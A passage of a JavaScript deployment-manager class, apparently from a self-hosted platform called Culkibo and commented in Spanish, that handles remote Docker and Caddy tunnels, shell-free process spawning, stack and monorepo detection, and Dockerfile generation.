          await Promise.resolve(lease.release()).catch(() => {});
        }
      }
    }
    if (typeof fleet.withDockerTunnel === 'function') {
      return fleet.withDockerTunnel(sid, async (leaseOrHost) => {
        const dh = typeof leaseOrHost === 'string' ? leaseOrHost : leaseOrHost?.dockerHost;
        if (!dh) throw new Error(`No se obtuvo DOCKER_HOST del túnel para el servidor «${sid}»`);
        return fn(dh, fleet);
      });
    }
    throw new Error(`serverFleetManager no expone túnel Docker para «${sid}»`);
  }

  /**
   * Abre un túnel efímero hacia la Admin API de Caddy del nodo remoto (o passthrough en `local`).
   * @template T
   * @param {string} serverId
   * @param {any} fleet
   * @param {(routeOpts: { adminUrl?: string | null, isRemote?: boolean }) => Promise<T>} fn
   * @returns {Promise<T>}
   */
  async _withRouteTarget(serverId, fleet, fn) {
    const sid = String(serverId || 'local').trim() || 'local';
    if (sid === 'local') return fn({ adminUrl: null, isRemote: false });
    if (!fleet || typeof fleet.withCaddyTunnel !== 'function') {
      throw new Error(`serverFleetManager no soporta túnel de Caddy para «${sid}»`);
    }
    return fleet.withCaddyTunnel(sid, async (tunnelInfo) => {
      const adminUrl = typeof tunnelInfo === 'string' ? tunnelInfo : tunnelInfo?.adminUrl;
      if (!adminUrl) throw new Error(`Túnel de Caddy inválido para el servidor «${sid}»`);
      return fn({ adminUrl, isRemote: true });
    });
  }

  /**
   * Abre un túnel de puerto loopback efímero hacia el contenedor remoto para `waitForHealth` y smoke tests.
   * @template T
   * @param {string} serverId
   * @param {any} fleet
   * @param {number} remoteHostPort
   * @param {(localPort: number) => Promise<T>} fn
   * @returns {Promise<T>}
   */
  async _withHealthTarget(serverId, fleet, remoteHostPort, fn) {
    const sid = String(serverId || 'local').trim() || 'local';
    if (sid === 'local') return fn(remoteHostPort);
    if (!fleet || typeof fleet.withPortTunnel !== 'function') {
      return fn(remoteHostPort);
    }
    return fleet.withPortTunnel(sid, remoteHostPort, async (tunnelInfo) => {
      const localPort = typeof tunnelInfo === 'number'
        ? tunnelInfo
        : Number(tunnelInfo?.localPort || tunnelInfo?.port || remoteHostPort);
      return fn(localPort);
    });
  }

  /** Asigna un puerto libre en el nodo remoto (delegando en `fleet.allocateRemotePort` o consultando `docker ps`). */
  async _allocateRemotePort(serverId, fleet, remoteDockerHost) {
    if (fleet && typeof fleet.allocateRemotePort === 'function') {
      return Number(await fleet.allocateRemotePort(serverId, { dockerHost: remoteDockerHost }));
    }
    const env = remoteDockerHost ? { ...process.env, DOCKER_HOST: remoteDockerHost } : undefined;
    const ps = await this.runDocker(['ps', '-a', '--format', '{{.Ports}}'], { timeoutMs: 10000, env });
    const used = new Set();
    if (ps.code === 0) {
      for (const m of (ps.stdout || '').matchAll(/:(\d{2,5})->/g)) {
        used.add(Number(m[1]));
      }
    }
    for (let p = 20000; p <= 24999; p++) {
      if (!used.has(p)) return p;
    }
    throw new Error(`No se encontró un puerto libre en el nodo remoto «${serverId}»`);
  }

  // -------------------------------------------------------------------------
  // Ejecución de binarios externos — sin shell, nunca
  // -------------------------------------------------------------------------

  /**
   * Lanza un binario con un array de argumentos y transmite su salida línea a
   * línea.
   *
   * `shell: false` es lo que convierte la inyección de comandos en imposible en
   * vez de en improbable. `env` permite pasar valores (secretos incluidos) sin
   * que aparezcan en argv.
   */
  /**
   * @param {string} bin
   * @param {string[]} args
   * @param {{timeoutMs?: number, cwd?: string, env?: any, onLine?: ((line: string) => void) | null, signal?: AbortSignal | null, projectId?: string | null}} [options]
   * @returns {Promise<{code: number, stdout: string, stderr: string, spawnError?: boolean, timedOut?: boolean, aborted?: boolean}>}
   */
  runTool(bin, args, { timeoutMs = 120000, cwd = undefined, env = undefined, onLine = null, signal = null, projectId = null } = {}) {
    if (signal && signal.aborted) {
      return Promise.resolve({ code: -3, stdout: '', stderr: 'Operación cancelada', aborted: true });
    }
    return new Promise((resolve) => {
      let child;
      try {
        child = spawn(bin, args, {
          cwd,
          env: env || process.env,
          shell: false,
          windowsHide: true
        });
      } catch (err) {
        return resolve({ code: -1, stdout: '', stderr: err.message, spawnError: true });
      }

      const op = projectId ? this._activeOps.get(projectId) : null;
      if (op) op.children.add(child);

      /** @type {string[]} */
      const stdout = [];
      /** @type {string[]} */
      const stderr = [];
      let buffered = '';

      const pump = (chunk, sink) => {
        const text = chunk.toString();
        sink.push(text);
        if (sink.length > 2000) sink.shift();
        if (!onLine) return;
        buffered += text;
        const lines = buffered.split(/\r?\n/);
        buffered = lines.pop() || '';
        for (const line of lines) {
          if (line.trim()) onLine(line.trim());
        }
      };

      child.stdout.on('data', (d) => pump(d, stdout));
      child.stderr.on('data', (d) => pump(d, stderr));

      let timedOut = false;
      let aborted = false;
      /** @type {ReturnType<typeof setTimeout> | null} */
      let killEscalation = null;

      const terminateChild = () => {
        try { child.kill('SIGTERM'); } catch (e) {}
        killEscalation = setTimeout(() => {
          try { child.kill('SIGKILL'); } catch (e) {}
        }, 5000);
        if (killEscalation.unref) killEscalation.unref();
      };

      const onAbort = () => {
        aborted = true;
        terminateChild();
      };
      if (signal) signal.addEventListener('abort', onAbort, { once: true });

      const timer = setTimeout(() => {
        timedOut = true;
        terminateChild();
      }, timeoutMs);
      if (timer.unref) timer.unref();

      const cleanup = () => {
        clearTimeout(timer);
        if (killEscalation) clearTimeout(killEscalation);
        if (signal) signal.removeEventListener('abort', onAbort);
        if (op) op.children.delete(child);
      };

      child.on('error', (err) => {
        cleanup();
        resolve({ code: -1, stdout: stdout.join(''), stderr: err.message, spawnError: true, aborted });
      });

      child.on('close', (code) => {
        cleanup();
        if (buffered.trim() && onLine) onLine(buffered.trim());
        resolve({
          code: aborted ? -3 : (timedOut ? -2 : code),
          stdout: stdout.join(''),
          stderr: stderr.join(''),
          timedOut,
          aborted
        });
      });
    });
  }

  runDocker(args, options = {}) {
    return this.runTool('docker', args, options);
  }

  /**
   * ¿Hay un daemon de Docker con el que hablar? No lanza nunca.
   * Cuando se pasa `env` (p. ej. `DOCKER_HOST` de un nodo remoto), no usa ni sobrescribe la caché local.
   * @param {{ force?: boolean, env?: any }} [opts]
   */
  async detectDocker({ force = false, env = undefined } = {}) {
    const isRemoteEnv = Boolean(env && env.DOCKER_HOST && env.DOCKER_HOST !== process.env.DOCKER_HOST);
    const now = Date.now();
    if (!isRemoteEnv && !force && this.dockerProbe && (now - this.dockerProbeAt) < this.dockerProbeTtlMs) {
      return this.dockerProbe;
    }
    const res = await this.runDocker(['version', '--format', '{{.Server.Version}}'], { timeoutMs: 5000, env });
    const version = (res.stdout || '').trim();
    const probe = res.code === 0 && version
      ? { available: true, version, reason: null }
      : {
          available: false,
          version: null,
          reason: res.spawnError
            ? 'El cliente de Docker no está instalado en este host'
            : (isRemoteEnv ? 'El daemon de Docker del servidor remoto no responde' : 'El daemon de Docker no responde en este host')
        };
    if (!isRemoteEnv) {
      this.dockerProbe = probe;
      this.dockerProbeAt = now;
    }
    return probe;
  }

  /** ¿Está `bin` en el PATH? Cacheado 60 s para no spawnear por cada build. */
  async hasBinary(bin) {
    if (!/^[a-z0-9_-]+$/i.test(bin)) return false;
    const now = Date.now();
    const cached = this._binaryCache.get(bin);
    if (cached && (now - cached.at) < 60000) return cached.ok;
    const res = await this.runTool(bin, ['--version'], { timeoutMs: 4000 });
    const ok = res.code === 0;
    this._binaryCache.set(bin, { at: now, ok });
    return ok;
  }

  // -------------------------------------------------------------------------
  // 1. Detección de la estrategia de construcción
  // -------------------------------------------------------------------------

  readJson(file) {
    try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return null; }
  }

  /**
   * Decide cómo se construye este proyecto.
   *
   * Orden: Dockerfile del usuario > railpack > nixpacks > Dockerfile generado.
   *
   * Railpack es el sucesor en Go de Nixpacks escrito por Railway (MIT). Se
   * prefiere cuando está porque produce imágenes más pequeñas y su detección
   * cubre más stacks que la nuestra. Pero es una dependencia OPCIONAL: si no
   * está ninguno de los dos, generamos un Dockerfile y seguimos. Culkibo no
   * puede exigir instalar un binario extra para desplegar una app de Node.
   *
   * @param {string} contextDir
   * @param {any} [project]
   * @param {{ isRemote?: boolean, workspacePath?: string | null, workspaceTool?: string | null, workspacePackageName?: string | null }} [opts]
   */
  async detectStrategy(contextDir, project = {}, { isRemote = false, workspacePath = null, workspaceTool = null, workspacePackageName = null } = {}) {
    const declaredPort = sanitizePort(project.containerPort, null);
    const healthPath = sanitizeHealthPath(project.healthPath) || DEFAULTS.healthPath;

    // Detección de monorepo (pnpm-workspace.yaml / turbo.json / nx.json / root workspaces)
    // Cuando `baseDirectory` apunta a un paquete de monorepo, conservamos la raíz como contexto
    // Docker para no cortar lockfiles ni paquetes hermanos (`packages/*`).
    let effectiveWorkspacePath = sanitizeWorkspacePath(workspacePath);
    let effectiveWorkspaceTool = workspaceTool || null;
    let effectiveWorkspacePkg = sanitizeWorkspacePackageName(workspacePackageName);
    /** @type {string | null} */
    let rootPackageManager = null;
    let scanDir = contextDir;

    if (!effectiveWorkspacePath && project && project.baseDirectory && project.baseDirectory !== '/' && project.baseDirectory !== '.') {
      const mono = this.detectMonorepoContext(contextDir, project.baseDirectory);
      if (mono) {
        effectiveWorkspacePath = mono.workspacePath;
        effectiveWorkspaceTool = mono.workspaceTool;
        effectiveWorkspacePkg = mono.workspacePackageName;
        rootPackageManager = mono.packageManager;
        scanDir = mono.appDir;
      }
    } else if (effectiveWorkspacePath) {
      try {
        scanDir = assertContainedPath(contextDir, effectiveWorkspacePath);
        const rootPkg = fs.existsSync(path.join(contextDir, 'package.json'))
          ? this.readJson(path.join(contextDir, 'package.json'))
          : null;
        rootPackageManager = this.detectNodePackageManager(contextDir, rootPkg);
      } catch (e) {
        effectiveWorkspacePath = null;
        scanDir = contextDir;
      }
    }

    const pkgPath = path.join(scanDir, 'package.json');
    const pkg = fs.existsSync(pkgPath) ? this.readJson(pkgPath) : null;
    const deps = pkg ? { ...(pkg.dependencies || {}), ...(pkg.devDependencies || {}) } : {};
    const scripts = (pkg && pkg.scripts) || {};

    // --- Dockerfile del usuario: manda sobre todo lo demás ------------------
    const userDockerfile = ['Dockerfile', 'dockerfile'].find(
      name => fs.existsSync(path.join(scanDir, name))
    );
    if (userDockerfile) {
      const relDockerfile = effectiveWorkspacePath
        ? path.posix.join(effectiveWorkspacePath, userDockerfile)
        : userDockerfile;
      return {
        builder: 'dockerfile',
        stack: 'dockerfile',
        dockerfile: relDockerfile,
        containerPort: declaredPort || this.readExposedPort(path.join(scanDir, userDockerfile)) || DEFAULTS.containerPort,
        healthPath,
        workspacePath: effectiveWorkspacePath,
        // Un Dockerfile ajeno puede traer su propio HEALTHCHECK; no lo pisamos.
        injectHealthcheck: false,
        reason: `Se usará el ${relDockerfile} del repositorio`
      };
    }

    // --- Detección del stack ------------------------------------------------
    const detected = this.detectStack(scanDir, pkg, deps, scripts);
    if (effectiveWorkspacePath) {
      if (rootPackageManager) detected.packageManager = rootPackageManager;
      if (fs.existsSync(path.join(contextDir, '.npmrc'))) detected.hasNpmrc = true;
      if (fs.existsSync(path.join(contextDir, 'patches'))) detected.hasPatches = true;
      if (fs.existsSync(path.join(contextDir, 'prisma'))) detected.hasPrisma = true;
    }

    // --- Constructores externos, si están --------------------------------
    //
    // Railpack primero: es el sucesor en Go de Nixpacks, escrito por Railway y
    // con licencia MIT. Pero tiene un requisito duro que Nixpacks no tiene:
    // habla el protocolo del cliente de BuildKit directamente y aborta nada más
    // arrancar si `BUILDKIT_HOST` no está definido. Tenerlo en el PATH no basta,
    // así que se comprueba y, si no está configurado, se sigue bajando por la
    // lista en vez de fallar el despliegue.
    // En nodos remotos (Fleet SSH), se omite railpack local para construir directamente sobre DOCKER_HOST.
    const externalBins = isRemote ? ['nixpacks'] : ['railpack', 'nixpacks'];
    for (const bin of externalBins) {
      if (!(await this.hasBinary(bin))) continue;
      if (bin === 'railpack' && !process.env.BUILDKIT_HOST) {
        continue; // sin BUILDKIT_HOST, railpack no puede construir nada
      }
      return {
        builder: bin,
        stack: detected.stack,
        dockerfile: null,
        containerPort: declaredPort || detected.containerPort,
        healthPath,
        workspacePath: effectiveWorkspacePath,
        injectHealthcheck: false,
        reason: `No hay Dockerfile; se construirá con ${bin} (detectado en el PATH)`
      };
    }

    if (!isRemote && await this.hasBinary('railpack')) {
      // Estaba, pero inutilizable. Decirlo es mejor que ignorarlo en silencio.
      console.warn('[DeployManager] railpack está instalado pero BUILDKIT_HOST no está definido; se ignora');
    }

    return {
      builder: 'generated',
      stack: detected.stack,
      dockerfile: null,
      containerPort: declaredPort || detected.containerPort,
      healthPath,
      injectHealthcheck: true,
      nodeMajor: detected.nodeMajor,
      packageManager: detected.packageManager || 'npm',
      nextOutput: detected.nextOutput || null,
      hasPrisma: Boolean(detected.hasPrisma),
      hasNpmrc: Boolean(detected.hasNpmrc),
      hasPatches: Boolean(detected.hasPatches),
      workspacePath: effectiveWorkspacePath,
      workspaceTool: effectiveWorkspaceTool,
      workspacePackageName: effectiveWorkspacePkg,
      goBuildTarget: detected.goBuildTarget || '.',
      startCommand: detected.startCommand,
      buildScript: detected.buildScript,
      outputDir: detected.outputDir,
      pythonEntry: detected.pythonEntry,
      pythonStartCmd: detected.pythonStartCmd || null,
      pythonPackageManager: detected.pythonPackageManager || 'pip',
      rustBinary: detected.rustBinary || null,
      denoEntry: detected.denoEntry || null,
      phpDocRoot: detected.phpDocRoot || null,
      isLaravel: Boolean(detected.isLaravel),
      elixirApp: detected.elixirApp || null,
      javaBuildTool: detected.javaBuildTool || null,
      javaHasWrapper: Boolean(detected.javaHasWrapper),
      reason: detected.stack === 'desconocido'
        ? 'No se ha podido identificar el stack; no hay Dockerfile ni railpack/nixpacks instalados'
        : `No hay Dockerfile; se generará uno para ${detected.stack}${effectiveWorkspacePath ? ` (monorepo ${effectiveWorkspaceTool || 'workspace'}: ${effectiveWorkspacePath})` : ''}`
    };
  }

  /**
   * Detecta si `rootDir` es la raíz de un monorepo (pnpm/yarn/npm/bun workspaces, Turborepo o Nx)
   * que contiene la aplicación en `baseDirectory`.
   * @param {string} rootDir
   * @param {any} baseDirectory
   */
  detectMonorepoContext(rootDir, baseDirectory) {
    const wsPath = sanitizeWorkspacePath(baseDirectory);
    if (!wsPath) return null;
    let appDir;
    try {
      appDir = assertContainedPath(rootDir, wsPath);
    } catch (e) {
      return null;
    }
    if (!fs.existsSync(appDir)) return null;

    const hasPnpmWs = fs.existsSync(path.join(rootDir, 'pnpm-workspace.yaml'));
    const hasTurbo = fs.existsSync(path.join(rootDir, 'turbo.json'));
    const hasNx = fs.existsSync(path.join(rootDir, 'nx.json'));
    const rootPkg = fs.existsSync(path.join(rootDir, 'package.json'))
      ? this.readJson(path.join(rootDir, 'package.json'))
      : null;
    const hasPkgWorkspaces = Boolean(
      rootPkg && (
        (Array.isArray(rootPkg.workspaces) && rootPkg.workspaces.length > 0) ||
        (rootPkg.workspaces && Array.isArray(rootPkg.workspaces.packages) && rootPkg.workspaces.packages.length > 0)
      )
    );
    if (!hasPnpmWs && !hasTurbo && !hasNx && !hasPkgWorkspaces) return null;

    const rootDeps = rootPkg ? { ...(rootPkg.dependencies || {}), ...(rootPkg.devDependencies || {}) } : {};
    const packageManager = this.detectNodePackageManager(rootDir, rootPkg);
    const workspaceTool = (hasTurbo || rootDeps.turbo)
      ? 'turbo'
      : (hasNx || rootDeps.nx)
        ? 'nx'
        : hasPnpmWs
          ? 'pnpm'
          : packageManager;
    const appPkg = fs.existsSync(path.join(appDir, 'package.json'))
      ? this.readJson(path.join(appDir, 'package.json'))
      : null;
    const workspacePackageName = sanitizeWorkspacePackageName(appPkg && appPkg.name);

    return {
      isMonorepo: true,
      rootDir,
      appDir,
      workspacePath: wsPath,
      workspaceTool,
      workspacePackageName,
      packageManager
    };
  }

  /** Lee el primer EXPOSE de un Dockerfile para saber a qué puerto hablar. */
  readExposedPort(dockerfilePath) {
    try {
      const text = fs.readFileSync(dockerfilePath, 'utf8');
      const match = text.match(/^\s*EXPOSE\s+(\d{1,5})/im);
      return match ? sanitizePort(match[1], null) : null;
    } catch (e) {
      return null;
    }
  }

  /** Detecta gestor de paquetes Node (`pnpm` / `yarn` / `bun` / `npm`) a partir de `packageManager` y lockfiles. */
  detectNodePackageManager(contextDir, pkg) {
    const pmField = String(pkg && pkg.packageManager || '').trim().toLowerCase();
    if (pmField.startsWith('pnpm@')) return 'pnpm';
    if (pmField.startsWith('yarn@')) return 'yarn';
    if (pmField.startsWith('bun@')) return 'bun';
    if (fs.existsSync(path.join(contextDir, 'pnpm-lock.yaml'))) return 'pnpm';
    if (fs.existsSync(path.join(contextDir, 'yarn.lock'))) return 'yarn';
    if (fs.existsSync(path.join(contextDir, 'bun.lock')) || fs.existsSync(path.join(contextDir, 'bun.lockb'))) return 'bun';
    return 'npm';
  }

  /** Detecta `output: 'standalone'` o `output: 'export'` en `next.config.*`. */
  detectNextOutput(contextDir) {
    for (const name of ['next.config.mjs', 'next.config.ts', 'next.config.js', 'next.config.cjs']) {
      const full = path.join(contextDir, name);
      if (!fs.existsSync(full)) continue;
      try {
        const src = fs.readFileSync(full, 'utf8');
        if (/output\s*:\s*['"]standalone['"]/.test(src)) return 'standalone';
        if (/output\s*:\s*['"]export['"]/.test(src)) return 'export';
      } catch (e) {}
    }
    return null;
  }

  /** Detecta si un proyecto Astro está configurado en modo SSR (`@astrojs/node` o `output: 'server'|'hybrid'`). */
  detectAstroSsr(contextDir, deps) {
    if (deps && deps['@astrojs/node']) return true;
    for (const name of ['astro.config.mjs', 'astro.config.ts', 'astro.config.js', 'astro.config.cjs']) {
      const full = path.join(contextDir, name);
      if (!fs.existsSync(full)) continue;
      try {
        const src = fs.readFileSync(full, 'utf8');
        if (/output\s*:\s*['"](?:server|hybrid)['"]/.test(src) || /@astrojs\/node/.test(src)) {
          return true;
        }
      } catch (e) {}
    }
    return false;
  }

  /** Clasificación del stack a partir de lo que hay en disco (Railpack/Nixpacks provider precedence). */
  detectStack(contextDir, pkg, deps, scripts) {
    const exists = (...p) => fs.existsSync(path.join(contextDir, ...p));
    let nodeMajor = pkg && pkg.engines ? sanitizeNodeMajor(pkg.engines.node) : null;
    if (!nodeMajor) {
      for (const vf of ['.nvmrc', '.node-version']) {
        if (exists(vf)) {
          try {
            nodeMajor = sanitizeNodeMajor(fs.readFileSync(path.join(contextDir, vf), 'utf8'));
            if (nodeMajor) break;
          } catch (e) {}
        }
      }
    }

    const isPrimaryNodeFramework = Boolean(
      pkg && (
        deps.next || deps.nuxt || deps['@sveltejs/kit'] || deps['@nestjs/core'] ||
        deps.express || deps.fastify || deps.vite || deps['react-scripts'] || deps.astro
      )
    );
    const isPrimaryNodeServer = Boolean(
      pkg && (
        deps.next || deps.nuxt || deps['@sveltejs/kit'] || deps['@nestjs/core'] ||
        deps.express || deps.fastify || deps.astro
      )
    );

    // PHP / Laravel tiene prioridad incluso con Vite auxiliar para compilar assets Blade
    if (exists('composer.json') && !isPrimaryNodeServer) {
      const composer = this.readJson(path.join(contextDir, 'composer.json')) || {};
      const phpReq = { ...(composer.require || {}), ...(composer['require-dev'] || {}) };
      const isLaravel = exists('artisan') || Boolean(phpReq['laravel/framework']);
      const phpDocRoot = (isLaravel || exists('public', 'index.php')) ? 'public' : '.';
      return { stack: 'php', containerPort: 8000, phpDocRoot, isLaravel };
    }

    // Rust (Cargo.toml)
    if (exists('Cargo.toml') && !isPrimaryNodeFramework) {
      /** @type {string | null} */
      let rustBinary = null;
      try {
        const cargo = fs.readFileSync(path.join(contextDir, 'Cargo.toml'), 'utf8');
        const pkgSection = cargo.match(/\[package\][\s\S]*?(?=\n\[|$)/);
        const nameMatch = (pkgSection ? pkgSection[0] : cargo).match(/^\s*name\s*=\s*["']([^"']+)["']/m);
        if (nameMatch && /^[A-Za-z0-9_-]{1,64}$/.test(nameMatch[1])) {
          rustBinary = nameMatch[1];
        }
      } catch (e) {}
      return { stack: 'rust', containerPort: 8080, rustBinary };
    }

    // Deno (deno.json / deno.jsonc)
    if ((exists('deno.json') || exists('deno.jsonc')) && !isPrimaryNodeFramework) {
      const candidateEntries = ['main.ts', 'server.ts', 'src/main.ts', 'src/server.ts', 'index.ts', 'mod.ts'];
      const denoEntry = candidateEntries.find((f) => exists(...f.split('/'))) || 'main.ts';
      return { stack: 'deno', containerPort: 8000, denoEntry };
    }

    // Elixir (mix.exs)
    if (exists('mix.exs') && !isPrimaryNodeFramework) {
      let elixirApp = 'app';
      try {
        const mixSrc = fs.readFileSync(path.join(contextDir, 'mix.exs'), 'utf8');
        const m = mixSrc.match(/app:\s*:([a-z][a-z0-9_]{0,63})/);
        if (m) elixirApp = m[1];
      } catch (e) {}
      return { stack: 'elixir', containerPort: 4000, elixirApp };
    }

    // Java (Gradle / Maven)
    if ((exists('build.gradle') || exists('build.gradle.kts') || exists('pom.xml')) && !isPrimaryNodeFramework) {
      const isGradle = exists('build.gradle') || exists('build.gradle.kts');
      const javaBuildTool = isGradle ? 'gradle' : 'maven';
      const javaHasWrapper = isGradle ? exists('gradlew') : exists('mvnw');
      return { stack: 'java', containerPort: 8080, javaBuildTool, javaHasWrapper };
    }

    // Go / Python con package.json auxiliar de assets tienen prioridad salvo framework Node primario
    if (exists('go.mod') && !isPrimaryNodeFramework) {
      let goBuildTarget = '.';
      if (!exists('main.go') && exists('cmd')) {
        try {
          const entries = fs.readdirSync(path.join(contextDir, 'cmd'), { withFileTypes: true });
          const sub = entries.find((e) => e.isDirectory() && /^[A-Za-z0-9._-]+$/.test(e.name) && exists('cmd', e.name, 'main.go'));
          if (sub) goBuildTarget = `./cmd/${sub.name}`;
        } catch (e) {}
      }
      return { stack: 'go', containerPort: 8080, goBuildTarget };
    }

    if ((exists('uv.lock') || exists('poetry.lock') || exists('requirements.txt') || exists('pyproject.toml') || exists('manage.py')) && !isPrimaryNodeFramework) {
      const entry = ['main.py', 'app.py', 'wsgi.py', 'manage.py'].find(f => exists(f)) || null;
      let pyDeps = '';
      let pyprojectRaw = '';
      try { if (exists('requirements.txt')) pyDeps += fs.readFileSync(path.join(contextDir, 'requirements.txt'), 'utf8').toLowerCase(); } catch (e) {}
      try {
        if (exists('pyproject.toml')) {
          pyprojectRaw = fs.readFileSync(path.join(contextDir, 'pyproject.toml'), 'utf8');
          pyDeps += '\n' + pyprojectRaw.toLowerCase();
        }
      } catch (e) {}
      const pythonPackageManager = exists('uv.lock')
        ? 'uv'
        : (exists('poetry.lock') || /\[tool\.poetry\]/i.test(pyprojectRaw))
          ? 'poetry'
          : 'pip';
      /** @type {string[] | null} */
      let pythonStartCmd = null;
      if (/\bfastapi\b/.test(pyDeps) && /\buvicorn\b/.test(pyDeps) && (entry === 'main.py' || entry === 'app.py')) {
        const mod = entry.replace(/\.py$/, '');
        pythonStartCmd = ['uvicorn', `${mod}:app`, '--host', '0.0.0.0', '--port', String(8000)];
      } else if (/\bdjango\b/.test(pyDeps) && /\bgunicorn\b/.test(pyDeps) && exists('manage.py')) {
        try {
          const dirs = fs.readdirSync(contextDir, { withFileTypes: true });
          const wsgiPkg = dirs.find((d) => d.isDirectory() && /^[A-Za-z_][A-Za-z0-9_]{0,63}$/.test(d.name) && exists(d.name, 'wsgi.py'));
          if (wsgiPkg) {
            pythonStartCmd = ['gunicorn', '--bind', '0.0.0.0:8000', `${wsgiPkg.name}.wsgi:application`];
          }
        } catch (e) {}
      } else if (/\bflask\b/.test(pyDeps) && /\bgunicorn\b/.test(pyDeps) && (entry === 'app.py' || entry === 'wsgi.py' || entry === 'main.py')) {
        const mod = entry.replace(/\.py$/, '');
        pythonStartCmd = ['gunicorn', '--bind', '0.0.0.0:8000', `${mod}:app`];
      }
      return { stack: 'python', containerPort: 8000, pythonEntry: entry, pythonStartCmd, pythonPackageManager };
    }

    if (pkg) {
      const packageManager = this.detectNodePackageManager(contextDir, pkg);
      const hasPrisma = exists('prisma');
      const hasNpmrc = exists('.npmrc');
      const hasPatches = exists('patches');

      if (deps.next || /next\s+build/.test(scripts.build || '')) {
        const nextOutput = this.detectNextOutput(contextDir);
        if (nextOutput === 'export') {
          return { stack: 'vite', containerPort: 80, nodeMajor, packageManager, hasPrisma, hasNpmrc, hasPatches, buildScript: 'build', outputDir: 'out' };
        }
        return { stack: 'next', containerPort: 3000, nodeMajor, packageManager, nextOutput, hasPrisma, hasNpmrc, hasPatches, buildScript: 'build', startCommand: null };
      }

      // Nuxt 3/4 SSR standalone (Nitro `.output/server/index.mjs`)
      if (deps.nuxt || /\bnuxt\s+build\b/.test(scripts.build || '')) {
        return { stack: 'nuxt', containerPort: 3000, nodeMajor, packageManager, hasPrisma, hasNpmrc, hasPatches, buildScript: 'build', startCommand: null };
      }

      // SvelteKit SSR (`@sveltejs/adapter-node` -> `build/index.js`) vs static (`@sveltejs/adapter-static`)
      if (deps['@sveltejs/kit']) {
        if (deps['@sveltejs/adapter-static'] && !deps['@sveltejs/adapter-node']) {
          return { stack: 'vite', containerPort: 80, nodeMajor, packageManager, hasPrisma, hasNpmrc, hasPatches, buildScript: 'build', outputDir: 'build' };
        }
        return { stack: 'sveltekit', containerPort: 3000, nodeMajor, packageManager, hasPrisma, hasNpmrc, hasPatches, buildScript: 'build', startCommand: null };
      }

      // Astro SSR (`@astrojs/node` / `output: 'server'|'hybrid'` -> `dist/server/entry.mjs`) vs Astro static
      if (deps.astro || /\bastro\s+build\b/.test(scripts.build || '')) {
        if (this.detectAstroSsr(contextDir, deps)) {
          return { stack: 'astro-ssr', containerPort: 4321, nodeMajor, packageManager, hasPrisma, hasNpmrc, hasPatches, buildScript: 'build', startCommand: null };
        }
        return { stack: 'vite', containerPort: 80, nodeMajor, packageManager, hasPrisma, hasNpmrc, hasPatches, buildScript: 'build', outputDir: 'dist' };
      }

      // Excluir frameworks SSR o servidores HTTP explícitos de la clasificación estática `vite` (Nixpacks/Railpack)
      const isSsrOrServer = Boolean(
        deps['@remix-run/node'] || deps['@react-router/node'] || deps['@tanstack/react-start'] ||
        deps.express || deps.fastify || deps['@nestjs/core'] || deps.hono || deps.koa ||
        (scripts.start && !/vite\s+preview|serve\s+-s|http-server/i.test(scripts.start))
      );
      const buildsStatic = !isSsrOrServer && (
        deps.vite || deps['@vitejs/plugin-react'] || deps['react-scripts'] ||
        /vite\s+build|react-scripts\s+build|ng\s+build/.test(scripts.build || '')
      );
      if (buildsStatic) {
        const outputDir = deps['react-scripts'] ? 'build' : 'dist';
        return { stack: 'vite', containerPort: 80, nodeMajor, packageManager, hasPrisma, hasNpmrc, hasPatches, buildScript: 'build', outputDir };
      }
      return {
        stack: 'node',
        containerPort: 3000,
        nodeMajor,
        packageManager,
        hasPrisma,
        hasNpmrc,
        hasPatches,
        buildScript: scripts.build ? 'build' : null,
        startCommand: scripts.start ? 'start' : null
      };
    }

    if (exists('go.mod')) {
      return { stack: 'go', containerPort: 8080, goBuildTarget: '.' };
    }

    if (exists('requirements.txt') || exists('pyproject.toml')) {
      const entry = ['main.py', 'app.py', 'wsgi.py', 'manage.py'].find(f => exists(f)) || null;
      return { stack: 'python', containerPort: 8000, pythonEntry: entry, pythonStartCmd: null, pythonPackageManager: 'pip' };
    }

    if (exists('index.html') || exists('public', 'index.html')) {
      return { stack: 'static', containerPort: 80, outputDir: exists('public', 'index.html') ? 'public' : '.' };
    }

    return { stack: 'desconocido', containerPort: DEFAULTS.containerPort };
  }

  // -------------------------------------------------------------------------
  // 2. Generación de Dockerfile
  // -------------------------------------------------------------------------

  /**
   * `.dockerignore` por defecto cuando el repo no aporta uno propio.
   * Solo excluye `dist`/`build` en stacks que los recompilan (evita romper apps estáticas o repos con `build/`).
   */
  defaultDockerignore(stack = null) {
    const excludeCompiledDirs = stack === 'vite' || stack === 'next' || stack === 'node' || stack === 'nuxt' || stack === 'sveltekit' || stack === 'astro-ssr';
    return [
      '# Generado por Culkibo para acelerar el contexto de construcción.',
      '.git',
      '.github',
      '.culkibo',
      'node_modules',
      '.next',
      '.nuxt',
      '.output',
      '.svelte-kit',
      ...(excludeCompiledDirs ? ['dist', 'build'] : []),
      ...(stack === 'rust' || stack === 'java' ? ['target'] : []),
      ...(stack === 'java' ? ['.gradle'] : []),
      ...(stack === 'elixir' ? ['_build', 'deps'] : []),
      ...(stack === 'php' ? ['vendor'] : []),
      'coverage',
      '.env',
      '.env.*',
      '!.env.example',
      '*.log',
      '.DS_Store',
      '__pycache__',
      '.venv',
      'venv',
      ''
    ].join('\n');
  }

  /**
   * Devuelve el texto del Dockerfile que construiría este proyecto.
   * Soporta BuildKit `--mount=type=cache`, `--mount=type=secret` (sin fugas a capas/historial),
   * monorepos (pnpm/yarn/turbo/nx), Bun nativo, SSR standalone y 12+ stacks.
   */
  generateDockerfile(strategy) {
    const port = sanitizePort(strategy.containerPort, DEFAULTS.containerPort);
    const nodeTag = `node:${strategy.nodeMajor || '22'}-alpine`;
    const pm = strategy.packageManager === 'pnpm' || strategy.packageManager === 'yarn' || strategy.packageManager === 'bun'
      ? strategy.packageManager
      : 'npm';
    const baseImage = pm === 'bun' ? 'oven/bun:1-alpine' : nodeTag;
    const jsRuntimeBin = pm === 'bun' ? 'bun' : 'node';
    const outputDir = /^[A-Za-z0-9._-]+$/.test(String(strategy.outputDir || '')) ? strategy.outputDir : 'dist';
    const cacheScope = safeSlug(strategy.projectSlug || 'default', 'app');
    const wsPath = sanitizeWorkspacePath(strategy.workspacePath);
    const wsPkg = sanitizeWorkspacePackageName(strategy.workspacePackageName);
    const wsTool = strategy.workspaceTool || (wsPath ? pm : null);

    const buildArgDecls = Array.isArray(strategy.buildArgNames)
      ? strategy.buildArgNames.filter(isValidEnvName).map((k) => `ARG ${k}`)
      : [];
    const secretNames = normalizeBuildSecretNames(strategy.secretNames || []);
